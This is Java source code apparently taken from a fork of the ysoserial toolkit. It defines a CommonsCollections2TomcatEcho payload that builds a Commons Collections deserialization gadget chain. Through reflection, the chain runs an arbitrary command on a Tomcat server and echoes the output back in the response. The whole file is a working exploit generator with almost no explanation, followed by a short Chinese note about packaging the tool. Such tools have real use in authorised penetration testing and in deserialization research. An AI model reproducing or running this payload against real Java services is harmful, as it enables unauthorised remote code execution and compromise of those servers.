// https://github.dev/kingkaki/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2TomcatEcho.java package ysoserial.payloads; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; import java.util.PriorityQueue; import java.util.Queue; public class CommonsCollections2TomcatEcho extends CommonsCollections2 { @Override public Queue&lt;Object&gt; getObject(final String command) throws Exception { final Object templates = Gadgets.createTemplatesImplTomcatEcho(command); // mock method name until armed final InvokerTransformer transformer = new InvokerTransformer(&#34;toString&#34;, new Class[0], new Object[0]); // create queue with numbers and basic comparator final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(transformer)); // stub data for replacement later queue.add(1); queue.add(1); // switch method called by comparator Reflections.setFieldValue(transformer, &#34;iMethodName&#34;, &#34;newTransformer&#34;); // switch contents of queue final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &#34;queue&#34;); queueArray[0] = templates; queueArray[1] = 1; return queue; } public static void main(final String[] args) throws Exception { PayloadRunner.run(CommonsCollections2TomcatEcho.class, args); } } 打包ysosrial
